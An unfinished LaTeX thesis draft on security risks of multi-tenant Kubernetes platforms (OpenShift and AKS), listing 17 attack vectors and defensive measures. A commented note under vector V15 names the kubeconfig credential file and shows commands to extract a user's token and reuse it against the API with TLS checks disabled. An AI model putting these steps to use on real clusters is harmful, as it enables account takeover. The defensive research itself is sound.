\chapter{Introduction}
With this chapter, the reader should be able to comprehend why this thesis was written, 
what it tries to accomplish and which topics are considered within the scope of this work.

\section{Motivation}

The increasing amount of Platform-as-a-Service (PaaS) solutions, cloud-hosted environments and microservice architectures introduce new attack scenarios. 
This creates the need for new defense strategies in both Development and Operations. 
Especially solutions providing \gls{k8s} compliant container orchestration are identifiably different and in high demand compared to long established solutions. 
This calls for a more detailed, focused examination. 

\section{Objective} \label{goal}

This thesis aims to answer the following questions:

\begin{itemize}

\item What generic security risks emerge when providing or using a multi-tenant PaaS solution,
with each tenant developing, deploying and running their own applications? 

\item How can a PaaS provider (serving internal and/or external users) mitigate those risks? 

\item  In this scope and from a PaaS provider viewpoint, how does an on-premise solution compare
to a public cloud solution? 

\end{itemize}

Another goal is to recommend security measures for different implementation use cases.
A comparison of existing risks and the need for action derived from it should serve as central point of view. 
Possible measures to mitigate those risks shall be explored, evaluated and exemplary put to use in practical examples.
Subsequently the risk will be re-evaluated in order to illustrate a viable risk management method.
With the results gathered, the thesis will compare different best practice implementations for different use cases and recommend measures for each.

\section{Scope limitation} \label{scopeLimit}

The thesis will first limit the view on the problem to a manageable scope by concentrating on the components enabled by default and those required for operations of two established and \gls{k8s} compliant solutions.
These solutions will be \gls{ocp} as an on-premise solution and \gls{aks} as a public cloud solution. 
The latest stable version of \gls{ocp} during the work on this thesis was version 3.11\footcite{ocpRelease}, which is based on v1.11 of \gls{k8s}.
Although \gls{k8s} v1.13 was already available through \gls{aks} at the same point in time, the available v1.11 was chosen to improve comparability.
%TODO add proof of azure version availability in appendix and reference it! (see screenshot pptx)
Components providing \gls{k8s} compliance will be the main focus, as these bear the most significance across all Kubernetes Certified solutions. 
A look at popular tools and frameworks used in such clusters will be avoided in order to keep the scope manageable, though some might be recommended as a mitigation.
In order to be applicable to a higher number of use cases, attacks and measures seen in environments with exceptionally high security requirements might be mentioned , but not  covered in their entirety. This might entail state-sponsored actors deploying zero-day exploits, which are not applicable to a majority of solutions deployed.
This thesis aims to provide insight to the risks of providing a PaaS solution and mitigations thereof. 
As such, it will look at the capabilities a potential provider has to (mis-)configure such solutions - inherent risks of the technologies themselves are only explored when measures to mitigate them are accessible from a provider standpoint. 
In short, the goal is to improve the security of your \gls{k8s} cluster, not \gls{k8s} itself.
To follow the \gls{owasp} Risk Rating Methodology\footcite{riskRating} down the line, we need to define our threat agents and group them when applicable\footcite{threatModeling}. Examining a list of threat actors published through SANS\footcite[][p. 12 to 17]{sansThreatActors}, we will only exclude state-sponsored actors. This leaves us with cyber criminals, hacktivists, systems administrators, end users, executives and partners.
Grouping the remaining actors by the factors used to estimate risks in section \ref{riskEstimate}, we can identify find three scenarios that encompass all of the actors:
%TODO Mention baseline security in summary!
%TODO change summary to fit the items here!
\begin{itemize}

\item Malicious third party attacking the solution from within the \gls{lan} and/or the internet

\item Malicious third party attacking from inside a hijacked container, i.e. remotely executing code or commands

\item Bad user, i.e. a negligent, hijacked or malicious account risking compromise of their own and/or other applications

\end{itemize}

\section{Research basis and its limits}

During the research for this thesis, a considerable amount of sources has been examined. Surprisingly, very little has been found regarding a risk-based point of view on \gls{k8s} solutions. A lot of sources start with measures and end with attacks, including one of the few published books\footcite{k8sBook}. They recommend specific security measures an explain the sort or attacks they defend against. The only commonly referenced source that specifically introduces major risks for container technologies, without rating them, is the NIST Application Container Security Guide.\footcite{nistK8s}
In addition to that, many of them are still works in progress, either unfinished or outdated.

Some of the sources commonly referenced include (in alphabetical order):
\begin{itemize}

\item The \gls{cis} Docker Benchmark\footcite{cisDocker}

\item The \gls{cis} Kubernetes Benchmark\footcite{cisK8s}

\item The book "Kubernetes Security - How to Build and Operate Applications Securely in Kubernetes"\footcite{k8sBook}

\item The NIST Application Container Security Guide\footcite{nistK8s}

\item The \gls{owasp} \gls{csvs}\footcite{csvsGithub}

\item The \gls{owasp} Docker Top 10\footcite{dockerTop10Github}

\end{itemize}

Other sources include solution specific advisories, i.e. for \gls{ocp}\footcite{ocpSecTips} and \gls{aks}\footcite{aksSecTips}, as well as recorded and openly available talks by different people in the industry. Especially the talks at KubeCon, the annual \gls{k8s} conference, are accessible through the \gls{cncf} youtube presence\footnote{Channel Link: https://www.youtube.com/channel/UCvqbFHwN-nwalWPjPUKpvTA/videos}. Many speakers include recognized people in the industry, contributors to the \gls{k8s} project and employees of reputable companies like Google, Red Hat and Microsoft.
A considerable number of other online sources were referenced in the in the sources above or found with online search engines.
These common recommendations exist, but neither claim to be exhaustive nor applicable to all future versions. In case of the \gls{cis} benchmarks, they are not even intended to be followed in full, but just as basis for security considerations.\footcite{cisJustRecommendation}
In accordance to this, we can only claim to provide these findings on a best-effort basis and not without reservation towards possible changes through future software versions or new information.
As with all systems, new attacks and vulnerabilities may emerge at any point in time. With sufficient research, the chance to have identified the most common attack vectors is probable but we want to empasize the limitations of this research.

%TODO full list of sources in appendix & reference here?

\chapter{Theory}
With this chapter, a reader with foundational knowledge of topics regarding Computer Science and/or Informatics 
will be able to grasp the specialized technologies discussed within the thesis and familiarize themselves with the definitions and terminology used throughout it.

\section{Infrastructure-as-a-Service}
In \gls{iaas} environments, a consumer trusts his \gls{iaas} provider with the management and control of the infrastructure needed to deploy his applications.
The provided service ends at provisioning of processing, storage, networks and other computing resources.\footcite[][p. 2 to 3]{nistcloud}
Therefore consumers do not need to manage their own data centers or topics like system uplink availability.
As shown in Figure ~\ref{fig:servicecomparison}, consumers are responsible for the \gls{os} layer and everything above it.

\begin{figure}[H]
\includegraphics[scale=0.4]{pictures/ServiceComparison.jpg} 
\caption{Comparison of responsibilities in different service models\protect\footcite{servicecomparison}}
\label{fig:servicecomparison}
\end{figure}

\section{Platform-as-a-Service}

In \gls{paas} environments, a consumer trusts his \gls{paas} provider with the management and control of even more resources needed to deploy his applications beyond those covered by \gls{iaas}.\footcite[][p. 2 to 3]{nistcloud}
In an ideal scenario, this leads to a consumer not having to concern himself with the underlying network, hardware, servers, operating systems, storage or even common middleware like log data collection and analysis\footcite{msPaas} and allows him to focus on other tasks, i.e. application development.
As a downside to this, a consumer might only have limited control on, among other factors, the software installed on the provisioned machines. 
Although this shifts some of the responsibility burden towards the provider, the situation isn't as clear-cut as one might think. 
Figure ~\ref{fig:servicecomparison} shows middleware and runtime as provided, but there is no clear standard on what capabilities or tools are included.
A consumer might require capabilities which aren't provided or wishes to avoid provider lock-in through proprietary tools, 
resulting in some middleware responsibilities falling back to the consumer. 
A consumer might also have to extensively configure or modify the application-hosting environment for compliance or security purposes. 
Even some low-level tasks aren't completely managed, i.e. \gls{vm} reboots to apply security updates.\footcite{msVmReboot}

\section{Containers}

Unsurprisingly, a basic building block of running containerized applications are containers.
In order to run and manage containers, several components and systems are needed. The most important ones will be introduced here.

\subsection{What are containers?}
A container is a standard unit of software that packages up code and all its dependencies so the application runs quickly and reliably from one computing environment to another.\footcite{whatContainer}
From a technical viewpoint, a container is an isolated process running in the userspace of a host \gls{os}. The host system shares the kernel with all containers on it and might share other resources, but containers are run from container images which include any code and dependencies needed in order to make them independent of the infrastructure they are running on (except the kernel).\footcite{containerIntro}

Linux containers were widely popularized through Docker, a container system initially based on \gls{lxc}.\footcite{containerHistory}
Containers provide isolation of multiple appllications running on the same machine and are often deployed in environments where this isolation would formerly have been achieved by using multiple \gls{vm}s. Thus, they are often compared to them despite the fundamental technical differences. The Kubernetes documentation illustrates the differences as seen in Figure ~\ref{fig:VMsVsContainers}.

\begin{figure}[H]
\includegraphics[scale=0.3]{pictures/VMsVsContainers.jpg} 
\caption{Comparison of different application deployments on the same hardware\protect\footcite{k8sDocsVmsContainers}}
\label{fig:VMsVsContainers}
\end{figure}

\subsection{Differentiating docker}
Talking about docker can be quite difficult, since the term is overloaded with different meanings - a company (Docker Inc.), their commercial products (Docker CE and Docker EE) and the former name of their open source project (formerly known as Docker, now called Moby).\footcite{dockerMoby}
Additionally, there is a \gls{cli} called docker engine, which serves as an interface to the containers running on a host. It includes a high-level container runtime (which will be talked about in the following section).\footcite{dockerEngine}
Some sources also talk about docker-formatted containers when they implement the same interfaces as the docker container runtime.\footcite{dockerFormatted}

\subsection{Images, image building and Dockerfiles}
A container image is a binary including all the data needed to run a container. It might also contain metadata on its needs and capabilities, i.e. version information through tags.\footcite{redhatImages}
Container images are sometimes referred to as docker images or docker-formatted images, but they can be run by other container runtimes and vice-versa.
In order to create a container image, you have to build it. This is often done through a build process executed by a container runtime. The instructions for container builds are commonly defined and documented in a Dockerfile\footcite{dockerfileDocs} (which may also be done by non-docker programs, adding onto the vocabulary confusion).
Container images can be distributed through container image registries, where images can be uploaded to and downloaded from. A commonly known example is docker hub, a public registry run by Docker Inc.

\subsection{Container standards and interfaces} \label{runtimes}

Without going into the nuances and historical developments, there are a multitude of programs mostly implementing three interfaces for container management.
The two basic interfaces are the runtime and image specifications under the \gls{oci} which standardize how containers and container images should be formatted and executed.\footcite{ociStandards}
The \gls{oci} also maintains a commonly used reference implementation called runc, alternatives include rkt and lmctfy.\footcite{lowLevelRuntimes}
Runc and similar programs implementing these specifications are commonly called low level runtimes, in contrast to the high level runtimes that control them.
These high level runtimes like containerd or CRI-O commonly manage more abstract features like downloading and verifying container images.\footcite{highLevelRuntimes}
Many high level runtimes today adhere to the \gls{cri} so they can be used interchangeably by container orchestrators.\footcite{criDocs}

%TODO maybe shorten and just talk about CRI upwards?

\section{Container orchestration}
Once you want to use multiple containers on different machines talking to each other and offering stable services that continue even when a container or machine fails, the need for automated systems to manage these containers arises. Orchestrators can also provide other advantages like load balancing and automated scaling.
Kubernetes systems are popular orchestrators currently in use.
The sum of hosts running the orchestrator and containers are called a cluster.
%TODO citation for kubernetes market share?


\subsection{Kubernetes}
At its core, \gls{k8s} is a control system for containers.
It constantly compares the current state with the set target state and tries to correct towards the target when needed, i.e. when a container crashes.
The intended way for a user to deploy or change their application is to manipulate the target state and let the \gls{k8s} system take care of the rest.\footcite{k8sBasics}
There are many \gls{k8s} distributions, many of which are certified kubernetes offerings, meaning they all comply to the same standards and interfaces. These are set by the Linux Foundation through the \gls{cncf} which oversees the project.\footcite{certifiedK8s}
The kubernetes code base is open source and maintained on GitHub, but any implementation fulfilling the (publicised) requirements can become \gls{k8s} certified, regardless of how much code they changed.\footcite{cncf} You could look at \gls{k8s} as a standardized interface for container orchestration with a public reference implementation.

\subsubsection{Kubernetes components}

In order to deliver a functioning \gls{k8s} cluster, multiple binary components are needed.
Master components provide the control plane, while node components are run on each underlying machine in order to maintain and provide the environment to execute the containers you want to run eventually.
Master components are often exclusively run on machines dedicated to them, which are called master nodes - in contrast to worker nodes, which run the containers your applications consist of.\footcite{k8sComponents}

The most relevant master components from the perspective of this thesis are:
\begin{itemize}

\item The kube-apiserver, which exposes the Kubernetes API. It is the front-end for the Kubernetes control plane; User commands are typically directed at and processed by this component.

\item Etcd, a distributed high-availability key value store where, among other things, secrets and authentication information are stored.

\end{itemize}

The important node components include:
\begin{itemize}

\item The kubelet, an agent running on each node in the cluster. It mostly monitors the state of any containers running because of kubernetes. These are run through pods, a kubernetes object designated to executing containers. The kubelet also interacts with the master components and reports on the monitoring data.

\item The container runtime which is responsible for actually running containers. \gls{ocp} uses Docker while \gls{aks} uses Moby, but any implementation of the \gls{cri} is supported.\footnote{For additional information, refer to section \ref{runtimes}} 

\end{itemize}

Figure \ref{fig:k8s-big-picture} illustrates these components in context. It is to note that users in this illustration are the users of the applications running in the cluster; From a provider standpoint the users would be the people responsible for development and operations.

\begin{figure}[H]
\includegraphics[scale=0.2]{pictures/big-picture.JPG} 
\caption{An overview of different \gls{k8s} components\protect\footcite{nicoPictures}}
\label{fig:k8s-big-picture}
\end{figure}

%TODO put Nicos Mail into appendix
%TODO component functions and number may vary per distribution

\subsubsection{Kubernetes objects}
Kubernetes objects are persistent entities that represent the desired state of your cluster. They can describe what containers should run, which resources are available to what system and the policies to apply (i.e. automatic restart behaviour and communication restrictions).
The intent is to modify these objects in order to change the target state, which the \gls{k8s} system then works towards by adjusting the current state to match.\footcite{k8sObjects}
Some objects, i.e. pods, belong to a specific namespace, meaning a virtual cluster of many in a shared physical cluster. Others, like node objects describing the underlying machine, exist outside of a specific namespace.
In order to understand how one can make the \gls{k8s} system run an application according to its requirements, an understanding of the basic objects is needed.
%TODO make object names bold/italics? also do that to all other important names/definitions in the theory chapter?

A pod is the basic \gls{k8s} object and encapsulates a container with some resources like an IP, storage and policies. Pods are typically each comprised of one container, a single instance of an application in \gls{k8s}. They may contain more than one container for cases where these are tightly coupled and directly share resources.\footcite{k8sPods}
That's all the pods do. They run.\footcite[][p. 4]{phippy}

Pods are usually not created manually, but started and stopped by a ReplicaSet. As a \gls{k8s} controller, its purpose is to maintain a stable set of replica pods running at any time in order to ensure availability of the function this type of pod provides.\footcite{k8sReplicaSets}

ReplicaSets are in turn managed by deployments. Just as replicaSets control pods, deployments control replicaSets in order to maintain the currently desired state of a cluster.
Figure \ref{fig:k8s-deployments} illustrates this connection.

\begin{figure}
\includegraphics[scale=0.2]{pictures/deployment.JPG} 
\caption{Connection between deployments and other \gls{k8s} objects down to containers\protect\footcite{nicoPictures}}
\label{fig:k8s-deployments}
\end{figure}

Since multiple identical pods may provide the same functionality and instances of this type of pod could be stopped or started at any point, how could a pod or other system address and connect to a pod? This can be solved by configuring a service, which abstracts a set of pods and their access policy. Typically, you talk to services instead of other pods directly. These services might then be published cluster-externally, i.e. through a load balancer provided by a cloud provider as seen in figure \ref{fig:loadbalancer}.

\begin{figure}
\includegraphics[scale=0.2]{pictures/loadbalancer.JPG} 
\caption{Connection between deployments and other \gls{k8s} objects down to containers\protect\footcite{nicoPictures}}
\label{fig:loadbalancer}
\end{figure}

%TODO other objects: volumes, daemonsets, podsecuritypolicies, networkpolicies, (others needed/referenced?)

\subsubsection{Using Kubernetes}
There are many ways and solutions to set up a \gls{k8s} cluster. Anyone can write their own one from scratch, but so-called turnkey solutions for cloud and on-premise environments exist, too, which significantly reduce the time and effort required to set up and run a cluster.\footcite{turnkey}
%TODO maybe: buy CaaS/PaaS/IaaS, cloud vs. on-prem, different scopes/features from different products
Once your cluster is set up, it is typically interacted with through the \gls{k8s} API. For human interaction, kubectl is a \gls{cli} reference implementation which enables remote interaction with it.\footcite{k8sApi}
In order to create or manipulate an object, you need to provide its new specification. This is typcally supplied to kubectl as a .yaml file, an example of which can be seen in listing \ref{lst:example-yaml-file}.\footcite{k8sObjects}

\begin{lstlisting}[
	caption={Exemplary .yaml file of a simple k8s deployment\protect\footcite{k8sObjects}},
	label={lst:example-yaml-file}]
apiVersion: apps/v1 # for versions before 1.9.0 use apps/v1beta2
kind: Deployment
metadata:
  name: nginx-deployment
spec:
  selector:
    matchLabels:
      app: nginx
  replicas: 2 # tells deployment to run 2 pods matching the template
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:1.7.9
        ports:
        - containerPort: 80
\end{lstlisting}

%TODO custom yaml highlighting? https://tex.stackexchange.com/questions/152829/how-can-i-highlight-yaml-code-in-a-pretty-way-with-listings/152856#152856

\subsection{OpenShift} \label{openshiftExplanation}

OpenShift is a commercial Kubernetes container platform by Red Hat. There are several different options to choose, deployable in different environments. OpenShift Online is hosted in a public cloud, while OpenShift Dedicated is hosted on dedicated nodes in a virtual private cloud. The option most relevant to this thesis is \gls{ocp}, which can be deployed on any infrastructure, including on-premise environments.\footcite{openShiftOptions}
Red Hat sponsors and supports the development of Fedora, a Linux distribution on which they base their \gls{rhel} \gls{os} on. \gls{rhel} is then used by them commercially by supplying its binaries and updates through commercial licenses.
Similar to this, Red Hat develops and supports a \gls{k8s} distribution called \gls{okd}, which then serves as a base for their OpenShift products, including \gls{ocp}.\footcite{ocpVsOkd}
\gls{okd} release versions correspond to the \gls{k8s} version it is based on, i.e. \gls{okd} 1.11 is based on \gls{k8s} 1.11.\footcite{okd}
\gls{ocp} versions may differ, but Red Hat maintains a list of tested integrations for each major \gls{ocp} release, giving insight to which \gls{k8s} version it is based on.\footcite{ocpK8sVersions}
\gls{ocp} is a certified kubernetes distribution, which means it implements the same interfaces as all the others.\footcite{certifiedK8s}
Despite this, the differences in intended usage become apparent quite quickly, starting with the \gls{cli} used to interact with a cluster (oc instead of kubectl).\footcite{ocpCli}
Even basic concepts like namespaces are different, as \gls{ocp} uses the similar but not identical concept of projects.\footcite{ocpProjects}
\gls{ocp} uses Docker as its container runtime by default, but CRI-O is another option.\footcite{ocpCrio}

\subsection{Azure Kubernetes Service}

The Azure Kubernetes Service is a managed \gls{k8s} solution offered by Microsoft and running on the Azure public cloud. 
The computing resources used to run the cluster are pre-configured and provisioned \gls{vm}s in the Azure cloud, which do not need to be configured and run a container runtime based on Moby, a toolkit from which the Docker runtime is built.\footcite{dockerMoby} 
\gls{k8s} versions in \gls{aks} directly correspond to the \gls{k8s} version they are based on.
As many cloud services do, there are multiple integrations to other cloud services, in case of \gls{aks} including an option to integrate your Azure Active Directory to authenticate users.\footcite{aadAksAuth}


%TODO any context missed here?

\chapter{Deriving the attack surface and security measures}

Picking up the three scenarios of section \ref{scopeLimit}, we identify the possible attack vectors in this chapter to get an overview of the attack surface that is posed by \gls{k8s} systems. Vectors and the possible attacks by different threat actors are explained as well as possible security measures introduced.

\section{Defining procedure and approach}
%TODO derive all vectors from the three scenarios, explain why you cannot prove that this is/will be everything, explain why grouped this way \& which systems/threat actors rolled together in it. List security measures for each.

The identification of attack vectors within scope turned out to be a big challenge, both in research and preparation for a clear presentation. 
As new minor versions of \gls{k8s} release approximately every tree months and the Kubernetes project only maintains release branches for the most recent three minor releases\footcite{k8sSupport}, the underlying system evolves continuously. Due to lengthy review processes, accredited literature about the topic are rare and risk being outdated quite quickly. Even less formal sources like blog posts or guidelines published by organizations are both rare, still unfinished at the point of this writing or updated continually, further complicating the creation of a snapshot regarding the current state. Nonetheless, we tried to achieve it on a best-effort basis.
These vectors are applicable to all \gls{k8s} solutions, although the available security measures will vary between different products or implementations. Thus, we will generically mention the applicable measures and mention specific examples for \gls{aks} and \gls{ocp}.
In order to give a more comprehensible picture, the scope of these vectors varies. Some areas of interest, i.e. unpatched software and vulnerabilities in the underlying server  infrastructure, have a broad scope. Since they are well known security topics applicable almost all systems, we felt comfortable to broeadly encapsulate them for a more clear understanding. If we were to rigorously differentiate between only slightly different vectors, this list would be multiple times as long as it already is.

\section{Identified vectors}
%TODO write out pretty, absorb explanations from risk estimate chapter
%TODO rename vectors - make shorter
The following headlines will each define and explain one of the 17 identified attack vectors of this thesis. For brevity of reference, each has a Vector ID assigned which is formatted as Vxx.

TODO mention these generic measures
LOG ALL THE THINGS
	ELK/EFK-stack or Splunk with log forwarding/aggregation (container AND nodes), k8s audit logging (k8s)
	
MONITORING AND ALERTING
	prometheus, grafana (visualization), neuvector, (sysdig) falco, aqua, twistlock


\subsection{V01 - Reconaissance through Kubernetes \& platform control plane interfaces}
Gather information useful for further attacks through accessible: the Kubernetes dashboard \& apiserver as well as potential platform webinterfaces \& apiserver(s)

components: kubernetes dashboard, kubernetes apiserver, OCP web console, 

TODO

MEASURES SAME AS V02

\subsection{V02 - Read confidentials through Kubernetes \& platform control plane interfaces}
Gather confidential information through the Kubernetes dashboard \& apiserver as well as potential platform webinterfaces \& apiserver(s)

TODO

DEACTIVATE OR BLOCK UNUSED INTERFACES
	administration: uninstall / deactivate configurable interfaces , check RBAC permissions with kubiscan
	from container: network policies blacklisting APIs/consoles
	from company network: firewall (bad practice)
	
	
LIMIT INTERFACE CAPABILITIES
	deactivate capabilities to the highest authority level  whenever possible/applicable
	
SECURE ACCESS
	no unauth, no ABAC, integrate existing RBAC you are managing anyway
	use 2FA when possible (i.e. for dev and/or admin access to cloud) <- openstack: 2FA may be integratable to AD? TODO
	
FOLLOW LEAST PRIVILEGE PRINCIPLE
	limit access to each user in their scope (possibly further - need to know principle?)
	
SECRETS MANAGEMENT
	DO NOT load secrets from dockerfile / podconfig / env vars or other shit! DO use kubernetes secrets (or better: external key mgmt like hashicorp vault or azure ad pod identity / openshift vault) TODO: how to enforce?
	
ENABLE ALERTING
	on events like adding admin / granting admin privs / creating namespace / touching things deemed critical. TODO: how?

\subsection{V03 - Change configuration through Kubernetes \& platform control plane interfaces}
Change the existing configuration through the Kubernetes dashboard \& apiserver as well as potential platform webinterfaces \& apiserver(s)
TODO

V06 LIMIT CAPABILITIES

EVERYTHING FROM V02

\subsection{V04 - Compromise internal k8s control plane components (etcd, scheduler, controller-manager)}
This vector comprises reconaissance, leaks of confidentials and configuration changes through Kubernetes components not intended to be accessible: etcd stores, kube-scheduler and kube-controller-manager

TODO

CLUSTER ISOLATION

FOLLOW ADDITIONAL TIPS BY SUPPLIER


\subsection{V05 - Supply compromised container (base) image}
Supplying a malicious container image leading to security violations on the cluster (remote access for an attacker, resource misuse, data leakage, …). Most easily done untargeted (dockerhub images or dockerfiles on tutorials/help forums), but can be done targeted, too. Additionally, an image build process typically runs as root, leading to compromise possibilities to compromise the node where an image is built from a rogue dockerfile. (TODO: provoking stale image usage to exploit vulns, too?)

TODO

POLICIES FOR CONTAINER IMAGES
	Define what makes an image safe (enough) for usage. (light: only allow verified dockerhub images. Heavy: run images through a vetting process or build them from scratch)
	Define in what intervals both policy and set of base images are reviewed

RESTRICT THE SET OF POTENTIALLY USED IMAGES
	Use a dedicated private image registry which only gets vetted images OR enforce image whitelisting from public sources (including restricting versions, only allow the ones you vetted!)
	
VET IMAGES BEFORE USAGE
	Run your defined image vetting process for every container before it becomes available for use
	Re-vet new versions before they are admitted for usage
	scan with fossa, clair, microscanner, OPA policies

RE-ASSESS ALL VERSIONS OF ALL IMAGES REGULARLY
	regularly scan all available images in all their versions and disable images that are (or have become) vulnerable. Especially old image versions should be purged, since those can be vulnerable to well-documented exploits.

\subsection{V06 - Supply compromised k8s configuration}
Supplying a malicious kubernetes configuration leading to security violations on the cluster (remote access for an attacker, resource misuse, data leakage, …). Most easily done untargeted (tutorials/ help forums), but can be done targeted, too.

TODO

RAISE OPERATOR AWARENESS
	Train operators (cluster administrators \& users) regularly									
	Make sure that operators are aware of the risks of copy-pasting									
										
OTHER ORGANIZATIONAL MEASURES
	write guidelines with good security policies (what to use by default, what exceptions could be allowed and what processes have to be followed before admitted)	

LIMIT CAPABILITIES
	K8s PodSecurityPolicies			Enable and configure global ( \& potentially additional namespace-identified) Pod Security Policies, which define default values and enforce specific settings if defined. ATTENTION: currently in preview for AKS!						
	(openshift SCCs)			(recommentations: TODO! RunAsUser=MustRunAsNonRoot , RunAsGroup=MustRunAsNonRoot, AllowPrivilegeEscalation=false (<- careful, might break setuid binaries! Not-as-good-alternative: DefaultAllowPrivilegeEscalation=false), privileged=false)						
										
	restrict communication			no traffic to oder projects (OCP) or namespaces (AKS)						
	restrict images			use private repo / dockerhub-official images only						All of these: either implemented by dev or enforced by admin. Suggestion: enforced by cluster admin (scc / networkpolicy in podsecuritypolicy) with exceptions granted when needed
	restrict host impact			no priviledged containers, no priviledge escalation (asking to become priviledged), restrict kernel capabilities, no root containers (maybe yes, but with user namespace remapping only?), procmounttype default (apply restrictions by container runtimes in /proc), restrict mount volume types and host volume paths, (maybe use sandboxing through gvisor / kata containers?)						
	verify with tool / 3rd party			put through kubesec.io offline/ kube-bench/ kubeaudit / kubeatf (enforce: k8guard) or 4-eyes-principle or security clearance on config changes (probably too overkill)						


\subsection{V07 - Compromise other application components (lateral movement)}
Once an attacker gains access to a container, he may try to access more lucrative application components or information, i.e. sniffing traffic or accessing databases or containers with more confidential information/traffic.

TODO

ENCRYPR CROSS-CONTAINER TRAFFIC
	istio with mTLS for traffic encryption and signing OR guideline for devs to use TLS everywhere OR enforce with OPA?		
			
AUTHORIZATION/AUTHENTICATION FOR ACCESS, EVEN WITHIN
	namespace isolation, network restriction, ...appSec problem?

\subsection{V08 - Container breakout (R/W, Privilege Escalation)}
Once inside a container, an attacker may try to gain access to the underlying host by a multitude of means. This includes invoking syscalls, accessing the host file system and elevation priviledges within or outside of the container environment

TODO

V06 LIMIT CAPABILITIES -> RESTRICT HOST IMPACT

\subsection{V09 - Compromise local image cache}
If the cached image of a container can be manipulated, another container (which might even seem to fulfill the same function) violating security principles could be started.

TODO

ENSURE IMAGE PROVENANCE
	docker content trust, code signing


\subsection{V10 - Modify running container}
Once inside a container, an attacker may try to modify the container to exfiltrate data or better suit their needs for further intrusion

TODO

LIMIT CAPABILITIES
	like V13, but during runtime

\subsection{V11 - Hoard resources (sabotage)}
The provided resources may be misconfigured or misused to disrupt service availability (i.e. through fork bombing or misconfiguration)

TODO

ISOLATION OF COMPONENTS
	different namespaces (with different resource limits) for different parts of app, depending on criticality
	
LIMIT RESOURCE USAGE
	per-app / per-namespace resource limits on CPU, Storage, RAM, Bandwidth, cloud budget, what else?
	
LIMIT ACCOUNT CAPABILITIES
	least privilege for dev accounts to limit misconfiguration (i.e. to his own namespace) <- no creation of new namespaces except for within his own resource limits!
	
LOGGING OR MONITORING CONFIG CHANGES
	see generic -> logging/monitoring

\subsection{V12 - Misuse resources (cryptojacking)}
The provided resources may be misconfigured or misused for financial gains (mining cryptocurrencies)

TODO

MEASURES SAME AS V11 EXCEPT COMPONENT ISOLATION

\subsection{V13 - Add malicious container}
A malicious container may be started within the cluster
TODO

LIMIT ADMISSION AND CAPABILITIES
	k8s: V06 -> limit capabilities
	container runtime: V16->additional restrictions + V17->minimal node setup


\subsection{V14 - Add malicious node}
A malicious node may be added to the cluster
TODO

REQUIRE ADMIN TO AUTHORIZE NODE ADD
	Source: NIST-SP800-190, chapter 4.3.5      TODO: how to in ocp / AKS?


\subsection{V15 - Bad user practice (outside of cluster)}
This vector comprises user practices outside of the cluster that lead to risks within it. Examples include phishing, openly publishing keys/tokens to public code repositories and more.

TODO

ORGANIZATIONAL MEASURES
	inform users \& admins of risks regarding…	
		…phishing (classic awareness)
		…openly publishing stuff (open source (repos), presentations, talking to external people, troubleshooting threads on stackoverflow, potential partners/vendors, …) TODO: are there infosec modules/courses/resources for this?


%TODO: dont forget
%default kubeconfig file location on user machine: $HOME/.kube/config <- contains certs + tokens for login, specifies which apiservers, ...
%get token from user: oc whoami --token
% call API with user token:	curl -X GET -H "Authorization: Bearer <token>" https://openshift.redhat.com:8443/oapi/v1 --insecure %
% login with user token:	oc login --token '<token>'
% check user rights: 

\subsection{V16 - Incufficient base infrastructure hardening}
The underlying nodes could allow an attacker easy entry, even if the containers themselves are hardened. This includes Side-Channel attacks like Spectre \& Meltdown

%TODO: also other (external) parts of company infrastructure
TODO

"CONVENTIONAL" HARDENING
	established resources like CIS benchmarks

V17 NODE PATCH MGMT MEASURES

V17 NODE MINIMAL OS MEASURES
	
ADDITIONAL RESTRICTIONS AVAILABLE
	disable SSH access to hosts whenever possible (access through physical when bare-metal / hypervisor interfaces if VM nodes). If needed and risk accepted, enable ssh access through bastion host
	close exposed ports configured, but not needed (dangling container runtime daemon?)
	CSVS chapter: infrastructure
	CIS Docker Benchmark chapters: Chapters 1-3 \& 5 (+ Docker Content trust)
	CIS Kubernetes Benchmark chapters: Worker Node Security Configuration \& Configuration Files
	NIST-SP800-190 chapters: 3.5, 4.5, 4.6
	cloud config: check with ScoutSuite and analyze/enforce with cloud-custodian, Azure: check with azurite?

\subsection{V17 - Entry through known, unpatched vulnerabilities}
Every system has to be kept up to date with  security patches. Publicly known vulnerabilities might otherwise be exploited, leading to potentially devastating violations of security principles

TODO

PATCH MANAGEMENT MEASURES
(Components: Hosts, Kubernetes cluster, containers, other cluster tools (Jenkins, …)
	Define responsibilities for Patch Management Guidelines and their execution (while accounting for vacation time and sick days)
	Define Patch Management Guideline(s) covering all components, I.e. when to patch, when to upgrade, when to take offline
	Executing people: subscribe to vulnerability notification feeds or set up automated patching
	AKS-specific: Security Updates are not rolled out automatically if that would result in downtime! Someone has to restart nodes manually or set up automated process!
	OpenShift-specific: execute guidelines
	Regularly assess all components for conformity with the desired state
	Host: Conventional patch management measures
	Kubernetes: execute guidelines
	Container: automated scanning (i.e. with clair) or regular manual assessment, subscribe to alerts (new vulns im container images / code OR other components!)
	
MINIMAL SETUP	
	Container-optimised node OS (i.e. CoreOS, Google Container-optimized OS)
	Use mimimal base images (slim is good, alpine is better) for your containers
	Install only tools required for the operation each specific container on the images used
	Avoid and eliminate tool functionality overlap (i.e. you don’t need two different tools to gather the same logs, each might be at risk through vulns)


\chapter{Assessing the attack surface risk}
%TODO: derive process/evolution of risk rating model, introduce rating by threat actors + tools + vector + platform, explain problems / inaccuracies

With the attack vectors identified, we introduce a customized risk estimation model for our purpose and explain the challenges of developing it. The model is then used to estimate the relative risk of each vector.

\section{Defining procedures and approach}
In order to achieve a view on the risks more accurately resembling situations where a solution might be implemented, several assumptions are made:

\begin{itemize}

\item People in contact with the solution are familiar with conventional security principles and measures, but are new to the technologies used in the solutions within scope. They might even be new to container and cloud solutions in general. This includes both users of the solution like developers and project managers, as well as operators and administrators.

\item It is assumed that no special requirements like industry-specific compliance requirements have to be followed and the workloads processed within the solution have no exceptionally high security requirements. 

\item Regarding the design and implementation of applications running on the solutions, it is assumed that conventional application security measures have been implemented, i.e. against the \gls{owasp} Top 10.\footcite{topten} The extent of those measures is assumed to be in accordance to moderate criticality of the data and service provided by the application.

\item Some risks increase or decrease drastically, depending on many specific configurations. Considering the high system complexity, ``getting it to work'' is hard enough for users and operators new to these technologies.\footcite{hackAndHarden} When setting up and configuring a setup, the default configurations are left as-is whenever possible. Guidelines of specific implementations are followed, but whenever measures are presented as optional and not required, they will be skipped. Before recommending security measures, the setup will be modified just enough to become functional, without regards to the security implementations.

\item Multiple tenants like different customers, teams or projects are separated by \gls{k8s} namespaces or \gls{ocp} projects respectively, not by clusters.

\end{itemize}


%START OLD STUFF, REVISIT%
